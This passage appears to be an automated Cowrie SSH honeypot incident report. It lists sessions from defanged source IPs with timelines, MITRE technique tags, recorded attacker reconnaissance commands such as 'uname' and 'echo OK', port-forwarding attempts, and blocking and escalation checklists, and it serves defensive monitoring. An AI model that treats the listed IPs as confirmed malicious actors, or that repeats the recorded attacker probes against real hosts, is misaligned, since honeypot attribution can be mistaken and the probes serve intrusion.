| `2026-07-19 08:05:50` | `cowrie.command.input` |
| `2026-07-19 08:06:00` | `cowrie.log.closed` |
| `2026-07-19 08:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.66[.]149` to AbuseIPDB if not already reported
- [ ] Block `35.205.66[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62a658974010

| Field | Detail |
|---|---|
| **Source IP** | `63.135.169[.]175` |
| **First Seen** | 2026-07-19 08:13 |
| **Last Seen** | 2026-07-19 08:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:13:29` | `cowrie.session.connect` |
| `2026-07-19 08:13:29` | `cowrie.client.version` |
| `2026-07-19 08:13:29` | `cowrie.client.kex` |
| `2026-07-19 08:13:30` | `cowrie.login.success` |
| `2026-07-19 08:13:30` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:13:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.135.169[.]175` to AbuseIPDB if not already reported
- [ ] Block `63.135.169[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fb80e6f3208

| Field | Detail |
|---|---|
| **Source IP** | `175.206.1[.]60` |
| **First Seen** | 2026-07-19 08:13 |
| **Last Seen** | 2026-07-19 08:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:13:40` | `cowrie.session.connect` |
| `2026-07-19 08:13:41` | `cowrie.client.version` |
| `2026-07-19 08:13:41` | `cowrie.client.kex` |
| `2026-07-19 08:13:42` | `cowrie.login.success` |
| `2026-07-19 08:13:43` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.206.1[.]60` to AbuseIPDB if not already reported
- [ ] Block `175.206.1[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de3bfbdd62bb

| Field | Detail |
|---|---|
| **Source IP** | `185.100.84[.]174` |
| **First Seen** | 2026-07-19 08:18 |
| **Last Seen** | 2026-07-19 08:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:18:37` | `cowrie.session.connect` |
| `2026-07-19 08:18:37` | `cowrie.client.version` |
| `2026-07-19 08:18:38` | `cowrie.client.kex` |
| `2026-07-19 08:18:38` | `cowrie.login.success` |
| `2026-07-19 08:18:39` | `cowrie.session.params` |
| `2026-07-19 08:18:39` | `cowrie.command.input` |
| `2026-07-19 08:18:39` | `cowrie.log.closed` |
| `2026-07-19 08:18:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.100.84[.]174` to AbuseIPDB if not already reported
- [ ] Block `185.100.84[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42710f6c349c

| Field | Detail |
|---|---|
| **Source IP** | `117.204.1[.]45` |
| **First Seen** | 2026-07-19 08:23 |
| **Last Seen** | 2026-07-19 08:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:23:06` | `cowrie.session.connect` |
| `2026-07-19 08:23:07` | `cowrie.client.version` |
| `2026-07-19 08:23:07` | `cowrie.client.kex` |
| `2026-07-19 08:23:09` | `cowrie.login.success` |
| `2026-07-19 08:23:09` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:23:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.204.1[.]45` to AbuseIPDB if not already reported
- [ ] Block `117.204.1[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5917765104b5

| Field | Detail |
|---|---|
| **Source IP** | `45.118.49[.]18` |
| **First Seen** | 2026-07-19 08:23 |
| **Last Seen** | 2026-07-19 08:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:23:19` | `cowrie.session.connect` |
| `2026-07-19 08:23:20` | `cowrie.client.version` |
| `2026-07-19 08:23:20` | `cowrie.client.kex` |
| `2026-07-19 08:23:22` | `cowrie.login.success` |
| `2026-07-19 08:23:22` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:23:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.118.49[.]18` to AbuseIPDB if not already reported
- [ ] Block `45.118.49[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf36cc210aef

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 08:23 |
| **Last Seen** | 2026-07-19 08:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:23:41` | `cowrie.session.connect` |
| `2026-07-19 08:23:41` | `cowrie.client.version` |
| `2026-07-19 08:23:41` | `cowrie.client.kex` |
| `2026-07-19 08:23:42` | `cowrie.login.success` |
| `2026-07-19 08:23:43` | `cowrie.session.params` |
| `2026-07-19 08:23:43` | `cowrie.command.input` |
| `2026-07-19 08:23:43` | `cowrie.log.closed` |
| `2026-07-19 08:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8caeccfbada

| Field | Detail |
|---|---|
| **Source IP** | `172.90.128[.]97` |
| **First Seen** | 2026-07-19 08:32 |
| **Last Seen** | 2026-07-19 08:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:32:46` | `cowrie.session.connect` |
| `2026-07-19 08:32:47` | `cowrie.client.version` |
| `2026-07-19 08:32:47` | `cowrie.client.kex` |
| `2026-07-19 08:32:48` | `cowrie.login.success` |
| `2026-07-19 08:32:49` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:32:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.90.128[.]97` to AbuseIPDB if not already reported
- [ ] Block `172.90.128[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a9a51a8395b

| Field | Detail |
|---|---|
| **Source IP** | `117.254.104[.]107` |
| **First Seen** | 2026-07-19 08:32 |
| **Last Seen** | 2026-07-19 08:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:32:55` | `cowrie.session.connect` |
| `2026-07-19 08:32:55` | `cowrie.client.version` |
| `2026-07-19 08:32:55` | `cowrie.client.kex` |
| `2026-07-19 08:32:58` | `cowrie.login.success` |
| `2026-07-19 08:33:00` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.254.104[.]107` to AbuseIPDB if not already reported
- [ ] Block `117.254.104[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8d6ef1f8782

| Field | Detail |
|---|---|
| **Source IP** | `124.67.120[.]106` |
| **First Seen** | 2026-07-19 08:36 |
| **Last Seen** | 2026-07-19 08:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:36:04` | `cowrie.session.connect` |
| `2026-07-19 08:36:05` | `cowrie.client.version` |
| `2026-07-19 08:36:05` | `cowrie.client.kex` |
| `2026-07-19 08:36:07` | `cowrie.login.success` |
| `2026-07-19 08:36:08` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.67.120[.]106` to AbuseIPDB if not already reported
- [ ] Block `124.67.120[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be85faad04d8

| Field | Detail |
|---|---|
| **Source IP** | `222.186.68[.]153` |
| **First Seen** | 2026-07-19 08:41 |
| **Last Seen** | 2026-07-19 08:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:41:40` | `cowrie.session.connect` |
| `2026-07-19 08:41:40` | `cowrie.client.version` |
| `2026-07-19 08:41:40` | `cowrie.client.kex` |
| `2026-07-19 08:41:42` | `cowrie.login.success` |
| `2026-07-19 08:41:44` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:41:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.186.68[.]153` to AbuseIPDB if not already reported
- [ ] Block `222.186.68[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca55aee6de86

| Field | Detail |
|---|---|
| **Source IP** | `65.20.198[.]159` |
| **First Seen** | 2026-07-19 08:41 |
| **Last Seen** | 2026-07-19 08:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:41:49` | `cowrie.session.connect` |
| `2026-07-19 08:41:49` | `cowrie.client.version` |
| `2026-07-19 08:41:49` | `cowrie.client.kex` |
| `2026-07-19 08:41:51` | `cowrie.login.success` |
| `2026-07-19 08:41:51` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.198[.]159` to AbuseIPDB if not already reported
- [ ] Block `65.20.198[.]159` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99bc923e36f3

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-19 08:45 |
| **Last Seen** | 2026-07-19 08:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:45:25` | `cowrie.session.connect` |
| `2026-07-19 08:45:26` | `cowrie.client.version` |
| `2026-07-19 08:45:26` | `cowrie.client.kex` |
| `2026-07-19 08:45:29` | `cowrie.login.success` |
| `2026-07-19 08:45:29` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:45:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e376ba67786c

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-07-19 08:48 |
| **Last Seen** | 2026-07-19 08:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:48:27` | `cowrie.session.connect` |
| `2026-07-19 08:48:27` | `cowrie.client.version` |
| `2026-07-19 08:48:27` | `cowrie.client.kex` |
| `2026-07-19 08:48:29` | `cowrie.login.success` |
| `2026-07-19 08:48:29` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:48:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dffbb88ae76

| Field | Detail |
|---|---|
| **Source IP** | `34.78.176[.]229` |
| **First Seen** | 2026-07-19 08:48 |
| **Last Seen** | 2026-07-19 08:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:48:32` | `cowrie.session.connect` |
| `2026-07-19 08:48:32` | `cowrie.login.success` |
| `2026-07-19 08:48:32` | `cowrie.session.params` |
| `2026-07-19 08:48:32` | `cowrie.command.input` |
| `2026-07-19 08:48:32` | `cowrie.command.input` |
| `2026-07-19 08:48:32` | `cowrie.command.failed` |
| `2026-07-19 08:48:32` | `cowrie.command.input` |
| `2026-07-19 08:48:32` | `cowrie.log.closed` |
| `2026-07-19 08:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.176[.]229` to AbuseIPDB if not already reported
- [ ] Block `34.78.176[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7420ac08e265

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-07-19 08:48 |
| **Last Seen** | 2026-07-19 08:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:48:34` | `cowrie.session.connect` |
| `2026-07-19 08:48:35` | `cowrie.client.version` |
| `2026-07-19 08:48:35` | `cowrie.client.kex` |
| `2026-07-19 08:48:38` | `cowrie.login.success` |
| `2026-07-19 08:48:39` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:48:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98b17ed3ef08

| Field | Detail |
|---|---|
| **Source IP** | `34.78.176[.]229` |
| **First Seen** | 2026-07-19 08:48 |
| **Last Seen** | 2026-07-19 08:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:48:45` | `cowrie.session.connect` |
| `2026-07-19 08:48:45` | `cowrie.login.success` |
| `2026-07-19 08:48:46` | `cowrie.session.params` |
| `2026-07-19 08:48:46` | `cowrie.command.input` |
| `2026-07-19 08:48:46` | `cowrie.command.failed` |
| `2026-07-19 08:48:50` | `cowrie.log.closed` |
| `2026-07-19 08:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.176[.]229` to AbuseIPDB if not already reported
- [ ] Block `34.78.176[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b40182fd0be5

| Field | Detail |
|---|---|
| **Source IP** | `34.78.176[.]229` |
| **First Seen** | 2026-07-19 08:48 |
| **Last Seen** | 2026-07-19 08:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:48:47` | `cowrie.session.connect` |
| `2026-07-19 08:48:47` | `cowrie.login.success` |
| `2026-07-19 08:48:48` | `cowrie.session.params` |
| `2026-07-19 08:48:48` | `cowrie.command.input` |
| `2026-07-19 08:48:50` | `cowrie.log.closed` |
| `2026-07-19 08:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.176[.]229` to AbuseIPDB if not already reported
- [ ] Block `34.78.176[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0c30d2ba45f

| Field | Detail |
|---|---|
| **Source IP** | `61.169.54[.]150` |
| **First Seen** | 2026-07-19 08:51 |
| **Last Seen** | 2026-07-19 08:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:51:47` | `cowrie.session.connect` |
| `2026-07-19 08:51:47` | `cowrie.client.version` |
| `2026-07-19 08:51:47` | `cowrie.client.kex` |
| `2026-07-19 08:51:50` | `cowrie.login.success` |
| `2026-07-19 08:51:51` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:51:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.169.54[.]150` to AbuseIPDB if not already reported
- [ ] Block `61.169.54[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7df830c1ccb8

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]128` |
| **First Seen** | 2026-07-19 08:51 |
| **Last Seen** | 2026-07-19 08:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:51:56` | `cowrie.session.connect` |
| `2026-07-19 08:51:57` | `cowrie.client.version` |
| `2026-07-19 08:51:57` | `cowrie.client.kex` |
| `2026-07-19 08:51:59` | `cowrie.login.success` |
| `2026-07-19 08:51:59` | `cowrie.direct-tcpip.request` |
| `2026-07-19 08:52:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]128` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-099086958116

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 08:53 |
| **Last Seen** | 2026-07-19 08:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 08:53:39` | `cowrie.session.connect` |
| `2026-07-19 08:53:39` | `cowrie.client.version` |
| `2026-07-19 08:53:39` | `cowrie.client.kex` |
| `2026-07-19 08:53:39` | `cowrie.login.success` |
| `2026-07-19 08:53:40` | `cowrie.session.params` |
| `2026-07-19 08:53:40` | `cowrie.command.input` |
| `2026-07-19 08:53:40` | `cowrie.log.closed` |
| `2026-07-19 08:53:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🟡 MEDIUM · IR-58fb1c95abaa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 04:55 |
| **Last Seen** | 2026-07-19 04:55 |
| **Session Duration** | 22s |
| **Login Attempts** | 0 |
| **Auth Success** | ❌ No |
| **Commands Executed** | `uname -s -v -n -r -m` |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 04:55:07` | `cowrie.session.params` |
| `2026-07-19 04:55:07` | `cowrie.command.input` |
| `2026-07-19 04:55:09` | `cowrie.log.closed` |
| `2026-07-19 04:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Monitor for repeat activity from `91.92.40[.]14`
- [ ] No immediate escalation required

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.22.117[.]112` | **30** | 2026-07-19 07:18 | 2026-07-19 07:18 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `34.78.176[.]229` | **30** | 2026-07-19 08:48 | 2026-07-19 08:48 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `35.205.66[.]149` | **30** | 2026-07-19 08:05 | 2026-07-19 08:05 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `207.175.41[.]109` | **10** | 2026-07-19 05:17 | 2026-07-19 05:17 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-07-19 05:15 | 2026-07-19 08:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **4** | 2026-07-19 05:43 | 2026-07-19 08:43 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `172.104.11[.]4` | **3** | 2026-07-19 08:38 | 2026-07-19 08:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-07-19 06:26 | 2026-07-19 06:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]165` | **3** | 2026-07-19 05:36 | 2026-07-19 05:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **3** | 2026-07-19 07:25 | 2026-07-19 07:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]152` | **3** | 2026-07-19 07:59 | 2026-07-19 07:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]156` | **3** | 2026-07-19 06:02 | 2026-07-19 06:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.235.41[.]203` | **2** | 2026-07-19 08:21 | 2026-07-19 08:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `179.61.192[.]156` | **2** | 2026-07-19 08:06 | 2026-07-19 08:17 | 1m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-19 05:45 | 2026-07-19 05:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]87` | **2** | 2026-07-19 05:37 | 2026-07-19 05:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.192[.]71` | **2** | 2026-07-19 08:01 | 2026-07-19 08:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | **2** | 2026-07-19 06:39 | 2026-07-19 07:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]135` | **2** | 2026-07-19 06:48 | 2026-07-19 06:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | **2** | 2026-07-19 05:25 | 2026-07-19 06:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.201.135[.]166` | 1 | 2026-07-19 05:14 | 2026-07-19 05:14 | 12s | 0 | `T1592` | 🟢 LOW |
| `112.31.93[.]229` | 1 | 2026-07-19 07:48 | 2026-07-19 07:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.234.232[.]184` | 1 | 2026-07-19 05:25 | 2026-07-19 05:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.187.147[.]13` | 1 | 2026-07-19 06:13 | 2026-07-19 06:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `161.35.8[.]0` | 1 | 2026-07-19 07:26 | 2026-07-19 07:27 | 50s | 0 | `T1592` | 🟢 LOW |
| `177.174.0[.]3` | 1 | 2026-07-19 05:25 | 2026-07-19 05:25 | 3s | 0 | `T1592` | 🟢 LOW |
| `178.178.222[.]53` | 1 | 2026-07-19 08:35 | 2026-07-19 08:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.100.84[.]174` | 1 | 2026-07-19 08:18 | 2026-07-19 08:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.216.145[.]166` | 1 | 2026-07-19 05:51 | 2026-07-19 05:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.29[.]11` | 1 | 2026-07-19 05:22 | 2026-07-19 05:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `207.175.116[.]89` | 1 | 2026-07-19 05:16 | 2026-07-19 05:17 | 5s | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | 1 | 2026-07-19 05:16 | 2026-07-19 05:17 | 33s | 0 | `T1592` | 🟢 LOW |
| `218.90.138[.]78` | 1 | 2026-07-19 08:52 | 2026-07-19 08:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.124.150[.]254` | 1 | 2026-07-19 07:12 | 2026-07-19 07:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.159[.]192` | 1 | 2026-07-19 06:41 | 2026-07-19 06:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.20[.]69` | 1 | 2026-07-19 04:59 | 2026-07-19 04:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]162` | 1 | 2026-07-19 05:39 | 2026-07-19 05:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-07-19 06:39 | 2026-07-19 06:40 | 1s | 0 | `T1592` | 🟢 LOW |
